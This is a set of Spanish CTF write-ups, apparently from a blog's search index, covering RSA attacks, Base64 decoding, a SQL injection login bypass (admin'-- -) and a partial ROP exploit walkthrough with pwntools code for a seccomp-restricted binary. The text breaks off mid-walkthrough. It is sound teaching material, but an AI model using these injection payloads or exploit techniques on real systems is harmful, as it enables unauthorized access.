'0x4354466c6561726e7b7273345f69735f61773373306d337d'  El mensaje está en formato numérico, por lo que tenemos que decodificarlo como bytes en ASCII:\n\u0026gt;\u0026gt;\u0026gt; bytes.fromhex('4354466c6561726e7b7273345f69735f61773373306d337d') b'CTFlearn{rs4_is_aw3s0m3}'  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/ctflearn/cryptography/rsa-beginner/","section":"ctf","summary":"RSA. Ataque de factorización","time":1,"title":"RSA Beginner"},{"contents":"Se nos proporcionan estos números:\ne: 1 c: 108193852288406505568171818194994500452464483136775497973720445 n: 1522605027922533360535618378132637429718068114961380688657908494580122963258952897654000350692006139  Tenemos el exponente $e$, el módulo $n$ y el texto cifrado $c$.\nEstá claro que estamos ante un criptosistema RSA. Vamos a recordar cómo funciona RSA:\nSe eligen dos números primos $p$ y $q$ de forma que el módulo $n = p \\cdot q$. Luego se escoge un exponente $e$ (normalmente 3 ó 65537) que sea coprimo con $\\phi(n) = (p - 1) \\cdot (q - 1)$.\nPara cifrar un mensaje $m$ (en formato numérico), se tiene que realizar esta operación:\n$$ c = m ^ e \\pmod{n} $$\nDonde $c$ es el texto cifrado. Y para descifrar el texto cifrado, tenemos que calcular $d = e ^ {-1} \\pmod{\\phi(n)}$ y luego realizar la siguiente operación:\n$$ m = c ^ d \\pmod{n} $$\nEn este punto, la clave pública es el conjunto ${e, n}$, mientras que la clave privada está compuesta por ${p, q}$.\nEsta vez, el exponente $e = 1$, por lo que $d = 1$ también, ya que es el inverso respecto de la multiplicación (y 1 es el elemento neutro de la multiplicación). Entonces, $m = c$.\nLo único que tenemos que hacer es decodificar el mensaje $m$ de número a caracteres en ASCII:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; bytes.fromhex('108193852288406505568171818194994500452464483136775497973720445') b'CTFlearn{b3tter_up_y0ur_e}'  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/ctflearn/cryptography/rsa-noob/","section":"ctf","summary":"RSA. Implementación incorrecta","time":1,"title":"RSA Noob"},{"contents":"Se nos proporciona un script con código Python para que lo ejecutemos:\n$ python3 runme.py picoCTF{run_s4n1ty_run}  ","image":"/images/misc.png","permalink":"https://7rocky.github.io/ctf/picoctf/general-skills/runme.py/","section":"ctf","summary":"Beginner picoMini 2022. 100 puntos. Ejecutar código Python","time":0,"title":"runme.py"},{"contents":"Se nos proporciona un archivo fuente Java llamado SafeOpener.java:\nimport java.io.*; import java.util.*; public class SafeOpener { public static void main(String args[]) throws IOException { BufferedReader keyboard = new BufferedReader(new InputStreamReader(System.in)); Base64.Encoder encoder = Base64.getEncoder(); String encodedkey = \"\"; String key = \"\"; int i = 0; boolean isOpen; while (i \u0026lt; 3) { System.out.print(\"Enter password for the safe: \"); key = keyboard.readLine(); encodedkey = encoder.encodeToString(key.getBytes()); System.out.println(encodedkey); isOpen = openSafe(encodedkey); if (!isOpen) { System.out.println(\"You have \" + (2 - i) + \" attempt(s) left\"); i++; continue; } break; } } public static boolean openSafe(String password) { String encodedkey = \"cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz\"; if (password.equals(encodedkey)) { System.out.println(\"Sesame open\"); return true; } else { System.out.println(\"Password is incorrect\\n\"); return false; } } }  Aquí encontramos una string sospechosa:\nString encodedkey = \"cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz\";  Parece codificada en Base64. Vamos a decodificarla:\n$ echo cGwzYXMzX2wzdF9tM18xbnQwX3RoM19zYWYz | base64 -d pl3as3_l3t_m3_1nt0_th3_saf3  La flag es simplemente: picoCTF{pl3as3_l3t_m3_1nt0_th3_saf3}.\n","image":"/images/reversing.png","permalink":"https://7rocky.github.io/ctf/picoctf/reverse-engineering/safe-opener/","section":"ctf","summary":"picoCTF 2022. 100 puntos. Análisis de código Java. Base64","time":0,"title":"Safe Opener"},{"contents":"Se nos proporciona un código fuente en Python para cifrar la flag:\nfromCrypto.Util.numberimportgetPrime, bytes_to_long m=bytes_to_long(open(\"flag\", \"rb\").read()) n=getPrime(512)*getPrime(512) e=[1337,31337] print(n) print(pow(m,e[0],n)) print(pow(m,e[1],n))  Y tenemos la salida del programa:\n88627598925887227793409704066287679810103408445903546693879278352563489802835708613718629728355698762251810901364530308365201192197988674078034209878433048946797619290221501750862580914894979204943093716650072734138749420932619469204815802746273252727013183568196402223549961607284086898768583604510696483111 45254947860172381004009381991735702721210786277711531577381599020185600496787746985669891424940792336396574951744089759764874889285927022268694128526139687661305707984329995359802337446670063047702309778972385903473896687843125261988493615328641864610786785749566148338268077425756876069789788618208807001704 16054811947596452078263236160429328686151351092304509270058479526590947874445940946506791900760052230887962479603369427120610506778471930164144528718052332194666418267005043709704814833963217926271924910466448499814399455203725279998913865531351070938872586642424346857094632491904168889134624707595846754719  El criptosistema utilizado es RSA, pero tiene una vulnerabilidad. La flag ($m$) se cifra dos veces como\n$$ c_1 = m ^ {e_1} \\pmod{n} $$\n$$ c_2 = m ^ {e_2} \\pmod{n} $$\nEl problema aquí es que el mismo mensaje se eleva a dos exponentes diferentes pero usando el mismo módulo $n$.\nPor la identidad de Bezout, dados dos enteros $a, b$ no nulos, existen enteros $u, v$ tales que\n$$ u \\cdot a + v \\cdot b = \\gcd{(a, b)} $$\nComo $\\gcd{(e_1, e_2)} = 1$, podemos encontrar valores $u, v$ tales que\n$$ u \\cdot e_1 + v \\cdot e_2 = 1 $$\nLa idea es hallar estos valores para calcular el mensaje $m$ de esta manera:\n$$ c_1^u \\cdot c_2^v = (m^{e_1})^u \\cdot (m^{e_2})^v = m^{u \\cdot e_1} \\cdot m^{v \\cdot e_2} = m^{u \\cdot e_1 + v \\cdot e_2} = m \\pmod{n} $$\nLos valores $u, v$ se calculan usando el GCD extendido (Algoritmo de Euclides Extendido).\nPor tanto, este es el código utilizado para conseguir la flag:\n$ python3 -q \u0026gt;\u0026gt;\u0026gt; def extended_gcd(a, b): ... if a % b: ... u, v, d = extended_gcd(b, a % b) ... return v, (d - a * v) // b, d ... return 0, 1, b ... \u0026gt;\u0026gt;\u0026gt; e1, e2 = 1337, 31337 \u0026gt;\u0026gt;\u0026gt; n = 88627598925887227793409704066287679810103408445903546693879278352563489802835708613718629728355698762251810901364530308365201192197988674078034209878433048946797619290221501750862580914894979204943093716650072734138749420932619469204815802746273252727013183568196402223549961607284086898768583604510696483111 \u0026gt;\u0026gt;\u0026gt; c1 = 45254947860172381004009381991735702721210786277711531577381599020185600496787746985669891424940792336396574951744089759764874889285927022268694128526139687661305707984329995359802337446670063047702309778972385903473896687843125261988493615328641864610786785749566148338268077425756876069789788618208807001704 \u0026gt;\u0026gt;\u0026gt; c2 = 16054811947596452078263236160429328686151351092304509270058479526590947874445940946506791900760052230887962479603369427120610506778471930164144528718052332194666418267005043709704814833963217926271924910466448499814399455203725279998913865531351070938872586642424346857094632491904168889134624707595846754719 \u0026gt;\u0026gt;\u0026gt; u, v, _ = extended_gcd(e1, e2) \u0026gt;\u0026gt;\u0026gt; m = pow(c1, u, n) * pow(c2, v, n) % n \u0026gt;\u0026gt;\u0026gt; bytes.fromhex(hex(m)[2:]) b'ictf{n3ver_r3use_m0dul1}\\n' \u0026gt;\u0026gt;\u0026gt; exit()  ","image":"/images/cryptography.png","permalink":"https://7rocky.github.io/ctf/imaginaryctf/same/","section":"ctf","summary":"ImaginaryCTF 10/08/2022. 75 puntos. RSA. Ataque de módulo común","time":1,"title":"same"},{"contents":"Se nos proporciona esta página web:\nSi miramos el código HTML de la página, veremos /debug:\nY ahí tenemos el código fuente de la aplicación web:\nfromflaskimportFlask, request, render_template, Response, url_for, g fromsqlite3importdbapi2assqlite3 fromfunctoolsimportwraps app=Flask(__name__) defget_db(): db=getattr(g, '_database', None) ifdbisNone: db=g._database =sqlite3.connect(':memory:', isolation_level=None) db.row_factory=sqlite3.Row withapp.app_context(): db.cursor().execute('CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT);') withapp.open_resource('schema.sql', mode='r') asf: db.cursor().executescript(f.read()) returndb @app.teardown_appcontext defclose_connection(exception): db=getattr(g, '_database', None) ifdbisnotNone: db.close() defquery_db(query, args=(), one=False): try: withapp.app_context(): cur=get_db().execute(query, args) rv=[dict((cur.description[idx][0], value) foridx, valueinenumerate(row)) forrowincur.fetchall()] return(rv[0] ifrvelseNone) ifoneelserv exceptExceptionase: returne returnNone @app.route('/', methods=['GET', 'POST']) deflogin(): ifrequest.method=='POST': q=\"select * from users where username = '%s' AND password = '%s';\"%(request.form.get('username', ''), request.form.get('password', '')) login=query_db(q, one=True) ifisinstance(login, Exception): error='%s: %s'%(login.__class__, login) returnrender_template('index.html', query=q, error=error, image=url_for('static', filename='images/dog.png')) ifloginisNone: returnrender_template('index.html', query=q, image=url_for('static', filename='images/dog.png')) iflogin.get('username', '') =='admin': returnrender_template('index.html', query=open('flag').read()) returnrender_template('index.html') @app.route('/debug') defdebug(): returnResponse(open(__file__).read(), mimetype='text/plain') if__name__=='__main__': app.run('0.0.0.0', port=1337)  Se trata de una aplicación Flask, pero el punto clave es este:\nq=\"select * from users where username = '%s' AND password = '%s';\"%(request.form.get('username', ''), request.form.get('password', ''))  La consulta anterior es vulnerable a inyección de código SQL ya que, al introducir una comilla simple, escaparemos del contexto de las comillas y podremos poner más comandos de SQL. Por ejemplo, si metemos admin'-- -, la consulta quedará como:\nselect*fromusers whereusername ='admin'-- -' AND password = '%s';  Entonces, tendremos acceso como admin sin conocer su contraseña:\nY ahí vemos la flag (HTB{SQL_1nj3ct1ng_my_w4y_0utta_h3r3}):\n","image":"/images/web.png","permalink":"https://7rocky.github.io/ctf/htb-challenges/web/sanitize/","section":"ctf","summary":"Inyección de código SQL. Bypass de autenticación","time":1,"title":"sanitize"},{"contents":"Se nos proporciona un binario de 64 bits llamado scrambler:\nArch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000)  También tenemos el binario de Glibc (libc.so_1.6) de la instancia remota, por lo que podemos usar pwninit para parchear el binario y usar esta librería, de manera que el exploit sea igual en local y en remoto:\n$ pwninit --libc libc.so_1.6 --bin scrambler --no-template bin: scrambler libc: libc.so.6 fetching linker https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.31-0ubuntu9.7_amd64.deb unstripping libc https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.31-0ubuntu9.7_amd64.deb setting ./ld-2.31.so executable symlinking libc.so.6 -\u0026gt; libc.so_1.6 copying scrambler to scrambler_patched running patchelf on scrambler_patched  Aunque el binario ha sido despojado (stripped):\n$ file scrambler scrambler: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=1343b327e61aac49d34bc641ccd80457126ef56e, for GNU/Linux 3.2.0, stripped  El proceso de ingeniería inversa no es muy difícil. Después de cargar el binario en Ghidra y renombrar variables y funciones, tenemos que esta es la función main:\nint main() { undefined4 uVar1; int iVar2; long in_FS_OFFSET; int option; undefined4 arg1; undefined4 arg2; undefined4 arg3; int i; undefined auStack40 [8]; long canary; canary = *(long *) (in_FS_OFFSET + 0x28); setup(); seccomp_rules(); i = 0; while (true) { puts(\"1) Try scrambling\"); puts(\"2) Quit\"); printf(\"\u0026gt; \"); __isoc99_scanf(\"%d\",\u0026amp;option); if (option != 1) break; if (i \u0026lt; 8) { puts(\"arg1 = \"); printf(\"\u0026gt; \"); __isoc99_scanf(\"%d\", \u0026amp;arg1); puts(\"arg2 = \"); printf(\"\u0026gt; \"); __isoc99_scanf(\"%d\", \u0026amp;arg2); puts(\"arg3 = \"); printf(\"\u0026gt; \"); __isoc99_scanf(\"%d\", \u0026amp;arg3); uVar1 = arg3; iVar2 = return_random(arg1,arg2); auStack40[iVar2] = (char) uVar1; i++; } else { puts(\"Not allowed!\"); } } puts(\"Good bye!\"); if (canary != *(long *) (in_FS_OFFSET + 0x28)) { /* WARNING: Subroutine does not return */ __stack_chk_fail(); } return 0; }  El binario está protegido con reglas seccomp. Podemos usar seccomp-tools para ver qué llamadas de systema podemos utilizar:\n$ seccomp-tools dump ./scrambler line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x0a 0xc000003e if (A != ARCH_X86_64) goto 0012 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x00 0x01 0x40000000 if (A 0x40000000) goto 0005 0004: 0x15 0x00 0x07 0xffffffff if (A != 0xffffffff) goto 0012 0005: 0x15 0x05 0x00 0x00000000 if (A == read) goto 0011 0006: 0x15 0x04 0x00 0x00000001 if (A == write) goto 0011 0007: 0x15 0x03 0x00 0x00000002 if (A == open) goto 0011 0008: 0x15 0x02 0x00 0x0000000a if (A == mprotect) goto 0011 0009: 0x15 0x01 0x00 0x0000003c if (A == exit) goto 0011 0010: 0x15 0x00 0x01 0x000000e7 if (A != exit_group) goto 0012 0011: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0012: 0x06 0x00 0x00 0x00000000 return KILL  Vemos que solo podemos usar open, read, write y mprotect. Por tanto, el objetivo del reto es leer la flag (que está en /home/ctf/flag.txt, dato del reto), y no conseguir una shell.\nAnalizando la función main, vemos que podemos introducir tres números (arg1, arg2 y arg3). Luego, arg1 y arg2 se pasan a la función que renombré como return_random. El resultado de esta función se usará como offset respecto a una dirección de la pila (stack) y arg3 será el valor que se almacene ahí (como char). Probablemente se vea mejor en la instrucción en ensamblador (tomada de la salida de objdump):\n40150c: 88 54 05 e0 mov BYTE PTR [rbp+rax*1-0x20],dl  Esta es la función return_random:\nint return_random(int arg1, int arg2) { int iVar1; time_t tVar2; tVar2 = time((time_t *) 0x0); srand((uint) tVar2); iVar1 = rand(); return arg2 + iVar1 % arg1; }  Está cogiendo un valor aleatorio y realizando operaciones matemáticas con los argumentos arg1 y arg2. Podríamos pensar en usar un generador de números pseudo-aleatorios (PRNG) inicializado en time(0) como el el programa, de manera que sepamos el valor de iVar2 y tengamos mayor control sobre el valor retornado de la función. Sin embargo, nos podemos olvidar del valor aleatorio si ponemos arg1 = 1, porque:\n$$ z = 0 \\pmod{1} \\quad, \\forall z \\in \\mathbb{Z} $$\nPor tanto, si arg1 = 1, entonces return_random(arg1, arg2) = arg2, por lo que tenemos control total el valor que devuelve return_random (igual tendría que haber cambiado el nombre de la función\u0026hellip; no es muy aleatorio).\nEn este punto, tenemos una primitiva \u0026ldquo;write-what-where\u0026rdquo;, porque controlamos arg3 (que irá a $dl, solo 1 byte) y controlamos el valor que devuelve return_address (que será el offset respecto a $rbp - 0x20, guardado en $rax).\nExiste otra limitación en la función main, que es que el programa no nos permitirá hacer \u0026ldquo;scrambling\u0026rdquo; si el contador llega a i = 8. Para evitar esto, podemos hacer uso de la primitiva \u0026ldquo;write-what-where\u0026rdquo; y cambiar el valor del contador a un número negativo, de manera que tengamos intentos de \u0026ldquo;scrambling\u0026rdquo; casi ilimitados. Esta es la instrucción en ensamblador que incrementa el contador:\n401510: 83 45 dc 01 add DWORD PTR [rbp-0x24],0x1  Vemos que el contador está almacenado en $rbp - 0x24. La primitiva \u0026ldquo;write-what-where\u0026rdquo; se realiza respecto a $rbp - 0x20, por lo que los 4 bytes anteriores (los int tienen 32 bits) tenemos el valor del contador. Podemos verificarlo con GDB poniendo un breakpoint en esa dirección:\n$ gdb -q scrambler_patched Reading symbols from scrambler_patched... (No debugging symbols found in scrambler_patched) gef➤ break *0x401510 Breakpoint 1 at 0x401510 gef➤ run Starting program: ./scrambler_patched 1) Try scrambling 2) Quit \u0026gt; 1 arg1 = \u0026gt; 1 arg2 = \u0026gt; -4 arg3 = \u0026gt; 100 Breakpoint 1, 0x0000000000401510 in ?? ()  gef➤ x/x $rbp-0x24 0x7fffffffe70c: 0x00000064 gef➤ x/d $rbp-0x24 0x7fffffffe70c: 100  Y aquí lo tenemos. Hemos sobrescrito el valor del contador para que sea 100 (0x64). Para conseguir un número negativo, tenemos que conseguir que el bit más significativo esté a 1. De hecho, el mínimo valor del tipo int es $-2^{31}$, que se representa como 0x80000000 (más información aquí). Entonces, si ponemos -1 en lugar de -4 y ponemos 128 (0x80) en vez de 100, obtendremos un número negativo grande, y no nos tendremos que preocupar más del número de intentos.\nSolo por probar:\ngef➤ run Starting program: ./scrambler_patched 1) Try scrambling 2) Quit \u0026gt; 1 arg1 = \u0026gt; 1 arg2 = \u0026gt; -1 arg3 = \u0026gt; 128 Breakpoint 1, 0x0000000000401510 in ?? ()  gef➤ x/x $rbp-0x24 0x7fffffffe70c: 0x80000000 gef➤ x/d $rbp-0x24 0x7fffffffe70c: -2147483648  Perfecto, ahora podemos empezar a pensar en qué hacer para explotar el binario.\nComo el objetivo es leer la flag y estamos limitados por las reglas seccomp, estas serán las instrucciones que tenemos que ejecutar para completar el reto:\n open(\u0026quot;/home/ctf/flag.txt\u0026quot;, O_RDONLY) read(fd, buffer, length) puts(buffer)  También, recordemos que NX está habilitado, por lo que tenemso que usar ROP para ejecutar código arbitrario. Al tener que introducir \u0026quot;/home/ctf/flag.txt\u0026quot;, tenemos que encontrar un gadget como mov qword ptr [rax], rdi; ret, ya que no tenemos otra manera de introducir texto en el programa. El binario no tiene este tipo de gadgets, pero Glibc sí. Por tanto, el primer paso será fugar una dirección de Glibc para eludir ASLR y usar offsets a los gadgets.\nGenial, vamos a empezar a escribir el exploit. Esto es lo que tenemos de momento:\n#!/usr/bin/env python3 from pwn import context, ELF, log, p64, remote, sys, u64 elf = ELF('scrambler_patched') glibc = ELF('libc.so_1.6', checksec=False) context.binary = elf def get_process(): if len(sys.argv) == 1: return elf.process() host, port = sys.argv[1], sys.argv[2] return remote(host, int(port)) def write_what_where(p, what: int, where: int): p.sendlineafter(b'\u0026gt; ', b'1') p.sendlineafter(b'arg1 = \\n\u0026gt; ', b'1') p.sendlineafter(b'arg2 = \\n\u0026gt; ', str(where).encode()) p.sendlineafter(b'arg3 = \\n\u0026gt; ', str(what).encode()) def main(): p = get_process() write_what_where(p, 0x80, -1) flag = b'/home/ctf/flag.txt' p.interactive() if __name__ == '__main__': main()  Con este código, tenemos intentos de \u0026ldquo;scramble\u0026rdquo; ilimitados. La función write_what_where implementa la explicación anterior de la primitiva.\nAhora tenemos que descubrir si podemos modificar la dirección de retorno y tomar control del flujo de ejecución del programa al salir del bucle while (con la opción 2).\nUna manera de hacerlo es saber que estamos escribiendo usando $rbp - 0x20 como dirección base. Como el binario es de 64 bits, la experiencia nos dice que la dirección de retorno guardada en la pila está en $rbp + 8, por lo que necesitamos un offset de 0x28 para modificar la dirección de retorno.\nSi no se tiene suficiente experiencia, podemos usar GDB para encontrar el offset. Estas son las límes que se ejecutan al poner la opción 2:\n40152a: 48 8d 3d 18 0b 00 00 lea rdi,[rip+0xb18] # 402049 \u0026lt;rand@plt+0xec9\u0026gt; 401531: e8 ca fb ff ff call 401100 \u0026lt;puts@plt\u0026gt; 401536: 90 nop 401537: b8 00 00 00 00 mov eax,0x0 40153c: 48 8b 4d e8 mov rcx,QWORD PTR [rbp-0x18] 401540: 64 48 33 0c 25 28 00 xor rcx,QWORD PTR fs:0x28 401547: 00 00 401549: 74 05 je 401550 \u0026lt;rand@plt+0x3d0\u0026gt; 40154b: e8 d0 fb ff ff call 401120 \u0026lt;__stack_chk_fail@plt\u0026gt; 401550: 48 83 c4 48 add rsp,0x48 401554: 5b pop rbx 401555: 5d pop rbp 401556: c3 ret  Podemos poner un breakpoint en 0x401555 (justo antes de pop rbp) para ver la dirección de retorno y $rbp:\n$ gdb -q scrambler_patched Reading symbols from scrambler_patched... (No debugging symbols found in scrambler_patched) gef➤ break *0x401555 Breakpoint 1 at 0x401555 gef➤ run Starting program: ./scrambler_patched 1) Try scrambling 2) Quit \u0026gt; 2 Good bye! Breakpoint 1, 0x0000000000401555 in ?? ()  gef➤ p/x $rbp $1 = 0x7fffffffe730 gef➤ x/10gx $rsp 0x7fffffffe730: 0x0000000000000000 0x00007ffff7dc40b3 0x7fffffffe740: 0x00007ffff7ffc620 0x00007fffffffe828 0x7fffffffe750: 0x0000000100000000 0x00000000004013c2 0x7fffffffe760: 0x0000000000401560 0x2f62a629e826bd42 0x7fffffffe770: 0x0000000000401190 0x00007fffffffe820  Entonces, la dirección de retorno es 0x00007ffff7dc40b3 (de __libc_start_main), que está en 0x7fffffffe738 ($rbp + 8, como era de esperar).\nNótese que $rbp será puesto a 0. Esto será un problema que me llevó mucho tiempo arreglar.\nVamos a continuar de momento. Ahora sabemos dónde escribir para modificar la dirección de retorno. por lo que podemos empezar a crear una ROP chain sencilla para fugar una dirección de Glibc.\nEsta vez no explicaré los conceptos tras esta técnica. Si necesitas más información, puedes ver otros retos como ropme o Here\u0026rsquo;s a LIBC para ver una explicación más detallada. La idea principal es llamar a puts usando la PLT poniendo la dirección de puts en la GOT como primer argumento (que irá en $rdi), de manera que puts imprima el contenido de esa dirección de la GOT, que será la dirección real de puts en Glibc en tiempo de ejecución.\nPodemos conseguir el gadget pop rdi; ret con ROPgadget:\n$ ROPgadget --binary scrambler | grep ': pop rdi ; ret$' 0x00000000004015c3 : pop rdi ; ret  Perfecto, esta es la función main del exploit:\ndef main(): p = get_process() pop_rdi_ret = 0x4015c3 while_addr = 0x401400 payload = p64(pop_rdi_ret) payload += p64(elf.got.puts) payload += p64(elf.plt.puts) payload += p64(while_addr) write_what_where(p, 0x80, -1) for i, b in enumerate(payload): write_what_where(p, b, 0x20 + 8 + i) p.sendlineafter(b'\u0026gt; ', b'2') p.recvline() puts_addr = u64(p.recvline().strip().ljust(8, b'\\0')) log.info(f'Leaked puts() address: {hex(puts_addr)}') p.interactive()  Si lo ejecutamos, obtenemos la fuga de memoria:\n$ python3 solve.py [*] './scrambler_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'.' [+] Starting local process './scrambler_patched': pid 350738 [*] Leaked puts() address: 0x7f80e640d450 [*] Switching to interactive mode 1) Try scrambling 2) Quit [*] Got EOF while reading in interactive $  Nótese que hemos usado 0x401400 como siguiente dirección a retornar, que es el comienzo del bucle while. No podemos llamar al main porque las reglas seccomp ya están aplicadas, y hay algunas configuraciones con setvbuf que ya no están permitidas.\nVamos a calcular la dirección base de Glibc.\nglibc.address = puts_addr - glibc.sym.puts log.info(f'Glibc base address: {hex(glibc.address)}')  Ahora tenemos la dirección base, que parece correcta porque termina en 000 en hexadecimal:\n$ python3 solve.py [*] './scrambler_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'.' [+] Starting local process './scrambler_patched': pid 353240 [*] Leaked puts() address: 0x7f4119ab8450 [*] Glibc base address: 0x7f4119a34000 [*] Switching to interactive mode 1) Try scrambling 2) Quit [*] Got EOF while reading in interactive $  Perfecto. Pero tenemos un problema. Nos dice \u0026ldquo;EOF while reading in interactive\u0026rdquo;, por lo que el programa se ha roto. Y esto es porque $rbp está en 0 cuando se retorna del main. Y como no podemos llamar al main desde el principio, no podemos poner ne $rbp su valor inicial.\nCuando hice el reto, no me di cuenta de esto y continué con la siguiente ROP chain para leer la flag. Pero luego me di cuenta de que necesitaba resolver el problema de $rbp antes.\nTenemos que hacer algo con $rbp, y solamente tenemos el binario (ya que Glibc no está fugado al crear la primera ROP chain). El objetivo es redirigir el flujo de ejecución del programa al bucle while, pero con un valor de $rbp válido (y no 0). Lo único que podemos hacer es buscar gadgets que involucren a $rbp:\n$ ROPgadget --binary scrambler | grep ret$ | grep rbp 0x000000000040125a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret 0x000000000040125b : add byte ptr [rcx], al ; pop rbp ; ret 0x0000000000401259 : add byte ptr cs:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret 0x000000000040125c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret 0x0000000000401257 : add eax, 0x2e4b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret 0x00000000004013b8 : add eax, edx ; mov dword ptr [rbp - 4], eax ; mov eax, dword ptr [rbp - 4] ; leave ; ret 0x0000000000401551 : add esp, 0x48 ; pop rbx ; pop rbp ; ret 0x0000000000401550 : add rsp, 0x48 ; pop rbx ; pop rbp ; ret 0x00000000004013bc : cld ; mov eax, dword ptr [rbp - 4] ; leave ; ret 0x0000000000401256 : mov byte ptr [rip + 0x2e4b], 1 ; pop rbp ; ret 0x00000000004013ba : mov dword ptr [rbp - 4], eax ; mov eax, dword ptr [rbp - 4] ; leave ; ret 0x00000000004013bd : mov eax, dword ptr [rbp - 4] ; leave ; ret 0x00000000004012d8 : nop ; pop rbp ; ret 0x00000000004015bb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret 0x00000000004015bf : pop rbp ; pop r14 ; pop r15 ; ret 0x000000000040125d : pop rbp ; ret 0x0000000000401554 : pop rbx ; pop rbp ; ret  Hay un gadget que podemos usar para controlar $rbp, y es pop rbp; ret. Sería genial si tuviéramos una dirección de la pila para ponerla en $rbp, pero no podemos fugar direcciones en la primera ROP chain y usarlas para controlar $rbp.\nPor tanto, probé a usar una dirección del propio binario:\ngef➤ vmmap [ Legend: Code | Heap | Stack ] Start End Offset Perm Path 0x000000003ff000 0x00000000400000 0x00000000000000 rw- ./scrambler_patched 0x00000000400000 0x00000000401000 0x00000000001000 r-- ./scrambler_patched 0x00000000401000 0x00000000402000 0x00000000002000 r-x ./scrambler_patched 0x00000000402000 0x00000000403000 0x00000000003000 r-- ./scrambler_patched 0x00000000403000 0x00000000404000 0x00000000003000 r-- ./scrambler_patched 0x00000000404000 0x00000000405000 0x00000000004000 rw- ./scrambler_patched 0x007ffff7d9d000 0x007ffff7da0000 0x00000000000000 rw- 0x007ffff7da0000 0x007ffff7dc2000 0x00000000000000 r-- ./libc.so_1.6 0x007ffff7dc2000 0x007ffff7f3a000 0x00000000022000 r-x ./libc.so_1.6 0x007ffff7f3a000 0x007ffff7f88000 0x0000000019a000 r-- ./libc.so_1.6 0x007ffff7f88000 0x007ffff7f8c000 0x000000001e7000 r-- ./libc.so_1.6 0x007ffff7f8c000 0x007ffff7f8e000 0x000000001eb000 rw- ./libc.so_1.6 0x007ffff7f8e000 0x007ffff7f92000 0x00000000000000 rw- 0x007ffff7f92000 0x007ffff7f94000 0x00000000000000 r-- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1 0x007ffff7f94000 0x007ffff7fa3000 0x00000000002000 r-x /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1 0x007ffff7fa3000 0x007ffff7fb1000 0x00000000011000 r-- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1 0x007ffff7fb1000 0x007ffff7fb2000 0x0000000001f000 --- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1 0x007ffff7fb2000 0x007ffff7fb3000 0x0000000001f000 r-- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1 0x007ffff7fb3000 0x007ffff7fb4000 0x00000000020000 rw- /usr/lib/x86_64-linux-gnu/libseccomp.so.2.5.1 0x007ffff7fb4000 0x007ffff7fb6000 0x00000000000000 rw- 0x007ffff7fc9000 0x007ffff7fcd000 0x00000000000000 r-- [vvar] 0x007ffff7fcd000 0x007ffff7fcf000 0x00000000000000 r-x [vdso] 0x007ffff7fcf000 0x007ffff7fd0000 0x00000000000000 r-- ./ld-2.31.so 0x007ffff7fd0000 0x007ffff7ff3000 0x00000000001000 r-x ./ld-2.31.so 0x007ffff7ff3000 0x007ffff7ffb000 0x00000000024000 r-- ./ld-2.31.so 0x007ffff7ffc000 0x007ffff7ffd000 0x0000000002c000 r-- ./ld-2.31.so 0x007ffff7ffd000 0x007ffff7ffe000 0x0000000002d000 rw- ./ld-2.31.so 0x007ffff7ffe000 0x007ffff7fff000 0x00000000000000 rw- 0x007ffffffde000 0x007ffffffff000 0x00000000000000 rw- [stack] 0xffffffffff600000 0xffffffffff601000 0x00000000000000 --x [vsyscall]  Necesitamos una dirección con permisos rw-, por lo que 0x404000 parece buena opción. Como el binario no tiene protección PIE, esta dirección será fija. No obstante, usé 0x404200 porque la GOT se almacena en 0x404000, y no quería romperla.\nPor tanto, tenemos que actualizar la ROP chain:\npop_rdi_ret = 0x4015c3 pop_rbp_ret = 0x40125d new_rbp = 0x404200 while_addr = 0x401400 payload = p64(pop_rdi_ret + 1) payload += p64(pop_rdi_ret) payload += p64(elf.got.puts) payload += p64(elf.plt.puts) payload += p64(pop_rbp_ret) payload += p64(new_rbp) payload += p64(while_addr)  Nótese que pop_rdi_ret + 1 (un gadget ret) se necesita para prevenir problemas con el alineamiento de pila (stack alignment) en printf. Y conseguimos un proceso interactivo:\n$ python3 solve.py [*] './scrambler_patched' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x3ff000) RUNPATH: b'.' [+] Starting local process './scrambler_patched': pid 363454 [*] Leaked puts() address: 0x7f5d037c6450 [*] Glibc base address: 0x7f5d03742000 [*] Switching to interactive mode 1) Try scrambling 2) Quit \u0026gt; $ 1 arg1 = \u0026gt; $ 1 arg2 = \u0026gt; $ 1 arg3 = \u0026gt; $ 1 1) Try scrambling 2) Quit \u0026gt; $ 2 Good bye! [*] Got EOF while reading in interactive  Sin embargo, tenemos otro problema relacionado con la protección del canario:\n40153c: 48 8b 4d e8 mov rcx,QWORD PTR [rbp-0x18] 401540: 64 48 33 0c 25 28 00 xor rcx,QWORD PTR fs:0x28 401547: 00 00 401549: 74 05 je 401550 \u0026lt;rand@plt+0x3d0\u0026gt; 40154b: e8 d0 fb ff ff call 401120 